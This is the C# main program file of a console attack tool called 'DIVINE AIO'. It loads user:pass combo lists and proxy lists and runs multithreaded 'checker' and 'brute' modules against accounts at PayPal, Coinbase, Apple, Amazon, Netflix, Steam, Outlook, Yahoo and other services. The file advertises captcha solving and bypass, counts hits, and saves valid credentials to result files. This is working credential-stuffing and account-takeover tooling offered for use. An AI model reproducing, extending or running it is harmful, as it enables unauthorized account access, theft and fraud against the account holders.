using Leaf.xNet;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using UHQKEK.Discordb;
using UHQKEK.Modules.Brute;
using UHQKEK.Modules.Capture;
using UHQKEK.Modules.VM;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK
{
    class Program
    {
        public static int Threads = 0;
        public static int Good = 0;
        public static int Fail = 0;
        public static int Free = 0;

        public static int ReCheck = 0;
        public static int Total = 0;
        public static int Check = 0;

        public static int Error = 0;
        public static int Cps = 0;
        public static int Retrie = 0;

        public static ProxyType Proxytype { get; set; } = ProxyType.HTTP;
        public static Random Rnd = new Random();

        public static string ModuleName = "";
        public static string PathResults = "";
        public static bool lines_in_use;
        public static List<string> cloneCombo = new List<string>();
        public static string Lock;
        public static readonly object Locker = new object();

        public static List<Thread> ThreadBase = new List<Thread>();
        public static ConcurrentQueue<string> Combos = new ConcurrentQueue<string>();
        public static List<string> Proxies = new List<string>();

        public static List<string> Flag = new List<string>();
        public static ConcurrentQueue<string> keyword = new ConcurrentQueue<string>();

        public static int captchaerror = 0;
        public static int slovedcaptchas = 0;
        public static string disyn;

        [STAThread]
        static void Main()
        {
            //lopaliki();
            stoter();
        }
        public static void stoter()
        {
            Logo.logo();
            Console.Title = "DIVINE AIO";
            string path = "config.json";
            Settings.config = File.Exists(path) ? JsonConvert.DeserializeObject<Settings.ConfigObject>(File.ReadAllText(path)) : Settings.settings(true, true);
            Lock = Settings.config.keylo;

            Console.WriteLine("Use Discord Stats Bot?[Y / N]");
            disyn = Console.ReadLine().ToUpper();

            //Uncomment This If you Want to Use Discord Bot
            //DiscordRPC1.Initialize(); 
            //botstr();
            startmethod();
        }
        public static void lopaliki() // Login
        {
            Console.Title = "DIVINE AIO";
            /*Licensing DIVINEAIO = new Licensing(new AppSettings()
            {
                ApplicationId = 8643972,
                ApplicationKey = "dd52fe821df5717a90dcaab18ffc4c35",
                RsaPubKey = "MIIDazCCAlOgAwIBAgIUMVWPF8NG1nuTrhNP4Bz9C94rNKIwDQYJKoZIhvcNAQEFBQAwRTELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMTAyMDUxNzUwMTVaFw0zMTAyMDMxNzUwMTVaMEUxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCg7ThQ/U06j2ulAmJQTx2aTdZu0CS07wYaw67ZQLLY4f6tl626r9RRV+jIK1u6GdcpkPqdphrh3rzOuNpNyx4nQZ+Q1s1DB2FDfFtI7UrXEGOA3xwOCf9JlF8rTo47h3AI2/ldKUki9BhNyX5ainy+RXP85R93hw8M9bTZkkiLD3e/xXJmuOzWSt6aC/3DjHfel7IEyj/LD7TEdkX1i1CUjozwGvHPifOThpB6cpJLGTzCjM7i8sFPMmD8R3rWwJ2s7b+74ET44rfnF59RaM/wtqagxI2WuD6GzsBVChtUKUcLzA/13MBOGMynOKCth8COQtVcDCqXw+FueWLo/LWDAgMBAAGjUzBRMB0GA1UdDgQWBBTKc+OuGA0WpPuDy8dfMC8liFnZhDAfBgNVHSMEGDAWgBTKc+OuGA0WpPuDy8dfMC8liFnZhDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBBQUAA4IBAQANEw4nx6lGZp1Po88qxAfdiSbggtmWRpxv1Vm6pbmqVa1JNzgYwF5NiBZR1rm45AWCyXrN/PBCUYwLuZ6g6OYKRzSVj3O8JyacLHP7B5MQfWNm+Ez/b80QQd8FcKrvW+Fxo3ym7PR0y4M+NvyMFaZVAqLE3PyfNC0QUtABl7xL7MYQ4I0sSl5Qo+A93pI4xY4kG+vRvuZ/6vq1ayd1tEapnr8gkpaiWLg+Pi/tNKRWF40a0sppkM4fsw8KW1rQimP0EgWz1Sl1OfEBpEJG47HEq0YjqL0BGGtpmIBYP5gobbu8cOlyeDtSlulvVkAiq/IyzsL+w4TnNpGpGK10yxpZ", // https://share.biitez.dev/i/874we.png
                ApplicationVersion = "1.0.0"
            });*/
            //DIVINEAIO.Connect();
            if (File.Exists("LoginDetails.xml"))
            {
                foreach (string readAllLine in File.ReadAllLines("LoginDetails.xml"))
                {
                    char[] chArray = new char[1] { ':' };
                    string[] strArray = readAllLine.Split(chArray);
                    string namuse = strArray[0];
                    string pasuse = strArray[1];
                    /*if (DIVINEAIO.Login(namuse, pasuse))
                    {
                        stoter();
                    }
                    else
                    {
                        Console.WriteLine("Invalid Username Or Password", Color.Red);
                    }*/
                }
            }
            else
            {
                //Methoder.logcheck();
            }
        }
        public static void botstr()
        {
            try
            {
                if(disyn == "Y")
                {

                    new Thread(new ThreadStart(DiscordBotr.MainDC)).Start();
                }
                //DiscordBotr.MainDC();
            }
            catch (Exception ex)
            {
                Console.Clear();
                Console.WriteLine("Bot Could not be Enabled... [Retrying]", Color.Red);
                Thread.Sleep(2000);
                Console.Clear();
                Console.WriteLine(ex);
            }
        }
        public static void startmethod()
        {
            Logo.logo();

            Console.Write("\n                                            [ ", Color.GhostWhite);
            Console.Write("1", Color.MediumPurple);
            Console.Write(" ] ", Color.GhostWhite);
            Console.Write("VM Modules", Color.MediumPurple);
            Console.Write("\n                                            [ ", Color.GhostWhite);
            Console.Write("2", Color.Aqua);
            Console.Write(" ] ", Color.GhostWhite);
            Console.Write("Capture Modules", Color.Aqua);
            Console.Write("\n                                            [ ", Color.GhostWhite);
            Console.Write("3", Color.Red);
            Console.Write(" ] ", Color.GhostWhite);
            Console.Write("Brute Modules", Color.Red);
            Console.Write("\n                                            [ ", Color.GhostWhite);
            Console.Write("4", Color.HotPink);
            Console.Write(" ] ", Color.GhostWhite);
            Console.Write("Captcha Settings", Color.HotPink);
            Console.Write("\n                                            [ ", Color.GhostWhite);
            Console.Write("5", Color.Lime);
            Console.Write(" ] ", Color.GhostWhite);
            Console.Write("Checker Settings", Color.Lime);
            Console.WriteLine("");

            switch (Console.ReadLine())
            {
                case "1":
                    Logo.logo();

                    Console.Write("\n                                       [ ", Color.GhostWhite);
                    Console.Write("! ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Choose Your VM Option", Color.LightBlue);
                    Console.WriteLine(""); ;
                    Console.Write("[ ", Color.GhostWhite);
                    Console.Write("1 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("SoundCloud VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("2 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("CoinBase VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("3 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Apple VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("4 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Discord VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("5 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Paypal VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("6 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Netflix VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("7 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Epic Games VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("8 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Ebay VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("9 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Dave VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("10 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Spotify VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("11 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("SmartProxy VM", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("12 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Uber VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("13 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Amazon VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("14 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("MoneyLion VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("15 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Earnin VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("16 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Godaddy VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("17 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Victorias Secret VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("18 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("AfterPay VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("19 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Crypto VM ", Color.MediumPurple);
                    Console.Write("[", Color.GhostWhite);
                    Console.Write("SOLVER", Color.Red);
                    Console.Write("]", Color.GhostWhite);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("20 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Nintendo Fortnite VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("21 ", Color.MediumPurple);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("ShopPay VM ", Color.MediumPurple);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("X ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Go Back \n", Color.MediumPurple);
                    switch (Console.ReadLine())
                    {
                        case "1":
                            ModuleName = "SoundCloud VM";
                            Threading.Worker.Add(new Func<string, bool>(SoundCloud.check));
                            break;
                        case "2":
                            ModuleName = "CoinBase VM";
                            Threading.Worker.Add(new Func<string, bool>(CoinBase.check));
                            break;
                        case "3":
                            ModuleName = "Apple VM";
                            Threading.Worker.Add(new Func<string, bool>(Apple.check));
                            break;
                        case "4":
                            ModuleName = "Discord VM";
                            Threading.Worker.Add(new Func<string, bool>(Discordch.check));
                            break;
                        case "5":
                            ModuleName = "PayPal VM";
                            Threading.Worker.Add(new Func<string, bool>(PayPal.check));
                            break;
                        case "6":
                            ModuleName = "Netflix VM";
                            Threading.Worker.Add(new Func<string, bool>(Netflix.check));
                            break;
                        case "7":
                            ModuleName = "EpicGames VM";
                            Threading.Worker.Add(new Func<string, bool>(EpicGames.check));
                            break;
                        case "8":
                            ModuleName = "Ebay VM";
                            Threading.Worker.Add(new Func<string, bool>(Ebay.check));
                            break;
                        case "9":
                            ModuleName = "Dave VM";
                            Threading.Worker.Add(new Func<string, bool>(Dave.check));
                            break;
                        case "10":
                            ModuleName = "Spotify VM";
                            Threading.Worker.Add(new Func<string, bool>(Spotify.check));
                            break;
                        case "11":
                            ModuleName = "SmartProxy VM";
                            Threading.Worker.Add(new Func<string, bool>(SmartProxy.check));
                            break;
                        case "12":
                            ModuleName = "Uber VM";
                            Threading.Worker.Add(new Func<string, bool>(Uber.check));
                            break;
                        case "13":
                            ModuleName = "Amazon VM";
                            Threading.Worker.Add(new Func<string, bool>(Amazon.check));
                            break;
                        case "14":
                            ModuleName = "MoneyLion VM";
                            Threading.Worker.Add(new Func<string, bool>(MoneyLion.check));
                            break;
                        case "15":
                            ModuleName = "Earnin VM";
                            Threading.Worker.Add(new Func<string, bool>(earnin.check));
                            break;
                        case "16":
                            ModuleName = "Godaddy VM";
                            Threading.Worker.Add(new Func<string, bool>(Godaddy.check));
                            break;
                        case "17":
                            ModuleName = "VictoriasSecret VM";
                            Threading.Worker.Add(new Func<string, bool>(victoriassecret.check));
                            break;
                        case "18":
                            ModuleName = "AfterPay VM";
                            Threading.Worker.Add(new Func<string, bool>(AfterPay.check));
                            break;
                        case "19":
                            ModuleName = "Crypto VM";
                            Threading.Worker.Add(new Func<string, bool>(CryptoVM.check));
                            break;
                        case "20":
                            ModuleName = "Nintendo Fortnite VM";
                            Threading.Worker.Add(new Func<string, bool>(FortVm.check));
                            break;
                        case "21":
                            ModuleName = "ShopPay VM";
                            Threading.Worker.Add(new Func<string, bool>(Shoppay.check));
                            break;
                        case "X":
                            Program.startmethod();
                            break;
                        case "x":
                            Program.startmethod();
                            break;
                        default:
                            Program.startmethod();
                            break;
                    }
                    break;
                case "2":
                    Console.Write("\n                                       [ ", Color.GhostWhite);
                    Console.Write("! ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Choose a Capture Module", Color.Aqua);
                    Console.WriteLine(""); ;
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("1 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("CoinBase Disabled ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("2 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Steam ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("3 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Valorant Full Cap ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("4 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Victorias Secret Cap ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("5 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Wendys ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("6 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Yahoo IB ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("7 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("BiteSquad ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("8 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Etsy ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("9 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("PayPal ", Color.Aqua);
                    Console.Write("[", Color.GhostWhite);
                    Console.Write("CapBypassed", Color.Lime);
                    Console.Write("]", Color.GhostWhite);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("10 ", Color.Aqua);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Stake ", Color.Aqua);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("X ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Go Back \n", Color.Aqua);
                    switch (Console.ReadLine())
                    {
                        case "1":
                            ModuleName = "CoinBaseDisabledShack";
                            Threading.Worker.Add(new Func<string, bool>(CoinBaseDisable.check));
                            break;
                        case "2":
                            ModuleName = "Steam";
                            Threading.Worker.Add(new Func<string, bool>(Steam.check));
                            break;
                        case "3":
                            ModuleName = "Valorant[user:pass]";
                            Threading.Worker.Add(new Func<string, bool>(Valorant.check));
                            break;
                        case "4":
                            ModuleName = "VictoriasSecret";
                            Threading.Worker.Add(new Func<string, bool>(victoriassecret.check));
                            break;
                        case "5":
                            ModuleName = "Wendys";
                            Threading.Worker.Add(new Func<string, bool>(Wendys.check));
                            break;
                        case "6":
                            ModuleName = "Yahoo IB";
                            Threading.Worker.Add(new Func<string, bool>(Yahoo2.check));
                            Console.WriteLine("Load Your Keyword File[1 KeyWord Per Line]", Color.Gold);
                            OpenFileDialog openFileDialog1 = new OpenFileDialog();
                            string fileName1;
                            do
                            {
                                openFileDialog1.Title = "Select KeyWords";
                                openFileDialog1.DefaultExt = "txt";
                                openFileDialog1.Filter = "Text files|*.txt";
                                openFileDialog1.ShowDialog();
                                fileName1 = openFileDialog1.FileName;
                            }
                            while (!File.Exists(fileName1) || fileName1 == null);
                            var keyword = File.ReadAllLines(fileName1).Distinct().ToArray();
                            foreach (string text in keyword)
                            {
                                Program.keyword.Enqueue(text);
                            }
                            break;
                        case "7":
                            ModuleName = "BiteSquad";
                            Threading.Worker.Add(new Func<string, bool>(BiteSquad.check));
                            break;
                        case "8":
                            ModuleName = "ETSY";
                            Threading.Worker.Add(new Func<string, bool>(etsy.check));
                            break;
                        case "9":
                            ModuleName = "PAYPAL FULL CAP";
                            Threading.Worker.Add(new Func<string, bool>(PPNEW.check));
                            break;
                        case "10":
                            ModuleName = "Stake[Solver]";
                            Threading.Worker.Add(new Func<string, bool>(Stake.check));
                            break;
                        case "X":
                            Program.startmethod();
                            break;
                        case "x":
                            Program.startmethod();
                            break;
                        default:
                            Program.startmethod();
                            break;

                    }
                    break;
                case "3":
                    Console.Write("\n                                       [ ", Color.GhostWhite);
                    Console.Write("! ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Choose a Brute Module", Color.Red);
                    Console.WriteLine(""); ;
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("1 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("AOL ", Color.Red);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("2 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("ATT ", Color.Red);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("3 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("BWW ", Color.Red);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("4 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("DoorDash ", Color.Red);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("5 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("OutLook ", Color.Red);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("6 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Patreon ", Color.Red);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("7 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("XBOX ", Color.Red);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("8 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Yahoo ", Color.Red);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("9 ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Yahoo ", Color.Red);
                    Console.Write("[", Color.GhostWhite);
                    Console.Write("API2 IB Searcher", Color.Lime);
                    Console.Write("]", Color.GhostWhite);
                    Console.Write("\n[ ", Color.GhostWhite);
                    Console.Write("X ", Color.Red);
                    Console.Write("] ", Color.GhostWhite);
                    Console.Write("Go Back \n", Color.Red);
                    switch (Console.ReadLine())
                    {
                        case "1":
                            ModuleName = "AOL";
                            Threading.Worker.Add(new Func<string, bool>(AOL.check));
                            break;
                        case "2":
                            ModuleName = "ATT";
                            Threading.Worker.Add(new Func<string, bool>(Att.check));
                            break;
                        case "3":
                            ModuleName = "BWW";
                            Threading.Worker.Add(new Func<string, bool>(buffalowildwings.check));
                            break;
                        case "4":
                            ModuleName = "DoorDash";
                            Threading.Worker.Add(new Func<string, bool>(DoorDash.check));
                            break;
                        case "5":
                            ModuleName = "OutLook";
                            Threading.Worker.Add(new Func<string, bool>(OutLook.check));
                            break;
                        case "6":
                            ModuleName = "Patreon";
                            Threading.Worker.Add(new Func<string, bool>(patreon.check));
                            break;
                        case "7":
                            ModuleName = "XBOX";
                            Threading.Worker.Add(new Func<string, bool>(XBox.check));
                            break;
                        case "8":
                            ModuleName = "Yahoo";
                            Threading.Worker.Add(new Func<string, bool>(Yahoo.check));
                            break;
                        case "9":
                            ModuleName = "Yahoo#2";
                            Threading.Worker.Add(new Func<string, bool>(Yahoo3.check));
                            break;
                        case "X":
                            Program.startmethod();
                            break;
                        case "x":
                            Program.startmethod();
                            break;
                        default:
                            Program.startmethod();
                            break;
                    }
                    break;
                case "4":
                    Captchas.setter();
                    Program.startmethod();
                    break;
                case "5":
                    CheckerSettings.checkerset();
                    Program.stoter();

                    break;
                default:
                    Program.startmethod();
                    break;
            }
            Starter.Startert();
            Threading.Starter();
        }
        public static void Folder()
        {
            try
            {
                PathResults = Directory.GetCurrentDirectory() + "\\Results\\" + $"\\{ModuleName}\\" + DateTime.Now.ToString("dd-MM-yyyy H-mm tt") + "\\";

                if (!Directory.Exists("Results"))
                {
                    Directory.CreateDirectory("Results");
                }
                if (!Directory.Exists(PathResults))
                {
                    Directory.CreateDirectory(PathResults);
                }
            }
            catch
            {

            }
        }
        public static void remove(string Combo)
        {
            if (lines_in_use == true)
            {
                cloneCombo.Remove(Combo);
            }
        }
        public static void Elapsed()
        {
            while (true)
            {
                var start = DateTime.Now;
                while (true)
                {
                    var runtime = (DateTime.Now - start).Minutes;
                    if (runtime != 0)
                    {
                        Cps = Convert.ToInt32(Check / runtime);
                    }
                }
            }
        }


        public static void Title()
        {
            Task.Factory.StartNew(delegate
            {
                while (true)
                {
                    Console.Title = string.Format("DIVINE AIO | {0} | Checked: {1}/{2} | Hits: {3} | Custom: {4} | Flaggeds: {5} | Fails: {6} | CPM: {7} | Retries: {8} ", ModuleName, Check, Total, Good, Free, ReCheck, Fail, Cps, Retrie + Error);
                }
            });
            Task.Factory.StartNew(delegate
            {
                while (true)
                {
                    if (Program.Lock == "N")
                    {
                        Logo.logo();
                        Console.Write($"\n                           Checked: {Program.Check}/{Program.Total}                 ", Color.GhostWhite);
                        Console.Write($"\n                           Valids: ", Color.GhostWhite);
                        Console.Write($"{Program.Good}                 ", Color.Lime);
                        Console.Write($"\n                           Customs: ", Color.GhostWhite);
                        Console.Write($"{Program.Free}                 ", Color.Orange);
                        Console.Write($"\n                           Invalids: ", Color.GhostWhite);
                        Console.Write($"{Program.Fail}                 ", Color.Red);
                        Console.Write($"\n                           Retries: ", Color.GhostWhite);
                        Console.Write($"{Program.Retrie}                 ", Color.Yellow);
                        Console.Write($"\n                           Errors: ", Color.GhostWhite);
                        Console.Write($"{Program.Error}                 ", Color.Brown);
                        Console.Write($"\n                           CPM: ", Color.GhostWhite);
                        Console.Write($"{string.Format("{0}", Program.Cps)}                 ", Color.Orange);
                        if (Captchas.CaptchaWhileChecking)
                        {
                            Console.Write($"\n                           Solved Captchas: ", Color.GhostWhite);
                            Console.Write("{Program.slovedcaptchas}                 ", Color.Lime);
                        }
                    }
                    Thread.Sleep(2000);
                }
            });

        }

        public static void Save(string data, string name)
        {
            ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();
            _readWriteLock.EnterWriteLock();
            try
            {
                using (StreamWriter sw = new StreamWriter(PathResults + name + ".txt", true))
                {
                    sw.WriteLine(data);
                    sw.Close();
                }
            }
            finally
            {
                _readWriteLock.ExitWriteLock();
            }
        }

        public static void LoadCombo()
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            string fileName;
            do
            {
                openFileDialog.Title = "Select Combos";
                openFileDialog.DefaultExt = "txt";
                openFileDialog.Filter = "Text files|*.txt";
                openFileDialog.ShowDialog();
                fileName = openFileDialog.FileName;
            }
            while (!File.Exists(fileName) || fileName == null);
            var Combo = File.ReadAllLines(fileName).Distinct().ToArray();

            foreach (string text in Combo)
            {
                Combos.Enqueue(text);
            }
            cloneCombo = Combo.ToList();
        }

        public static void LoadProxie()
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            string fileName;
            do
            {
                openFileDialog.Title = "Select Proxies";
                openFileDialog.DefaultExt = "txt";
                openFileDialog.Filter = "Text files|*.txt";
                try { openFileDialog.ShowDialog(); }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
                fileName = openFileDialog.FileName;
            }
            while (!File.Exists(fileName) || fileName == null);

            List<string> Proxie = new List<string>(File.ReadAllLines(fileName));
            Proxies = Proxie;
        }
    }
}
